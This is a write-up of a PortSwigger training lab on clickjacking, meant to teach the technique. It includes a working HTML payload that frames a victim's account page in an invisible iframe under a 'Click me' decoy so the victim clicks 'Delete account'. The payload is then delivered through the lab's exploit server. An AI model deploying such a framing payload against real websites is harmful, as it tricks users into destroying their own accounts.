# Basic clickjacking with CSRF token protection

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected), you'll learn: Basic clickjacking with CSRF token protection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains login functionality and a delete account button that is protected by a [CSRF token](https://portswigger.net/web-security/csrf/tokens). A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-1/images/Pasted%20image%2020230102033915.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-1/images/Pasted%20image%2020230102033934.png)

In here, we can update our email and delete account.

**View source page:**
```html
<div id=account-content>
    <p>Your username is: wiener</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required type="hidden" name="csrf" value="9QQV1ykloZOA78c916sgooRLy8SJZEbD">
        <button class='button' type='submit'> Update email </button>
    </form>
    <form id=delete-account-form action="/my-account/delete" method="POST">
        <input required type="hidden" name="csrf" value="9QQV1ykloZOA78c916sgooRLy8SJZEbD">
        <button class="button" type="submit">Delete account</button>
    </form>
</div>
```

Also, they're using a CSRF token try to prevent CSRF attack.

**Now, let's build a hidden `<iframe>` and a clickbait text:**
```html
<html>
    <head>
        <title>Basic clickjacking with CSRF token protection</title>
        <style type="text/css">
            #targetWebsite {
                position:relative;
                width:700px;
                height:700px;
                opacity:0.0001;
                z-index:2;
            }

            #decoyWebsite {
                position:absolute;
                top:495px;
                left:60px;
                z-index:1;
            }
        </style>
    </head>
    <body>
        <div id="decoyWebsite">Click me</div>
        <iframe id="targetWebsite" src="https://0a2f006904c03654c0f5634d009f00aa.web-security-academy.net/my-account"></iframe>
    </body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-1/images/Pasted%20image%2020230102044948.png)

**Then, host it on the exploit server, and deliver to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-1/images/Pasted%20image%2020230102045023.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Clickjacking/Clickjacking-1/images/Pasted%20image%2020230102045030.png)

We did it!

# What we've learned:

1. Basic clickjacking with CSRF token protection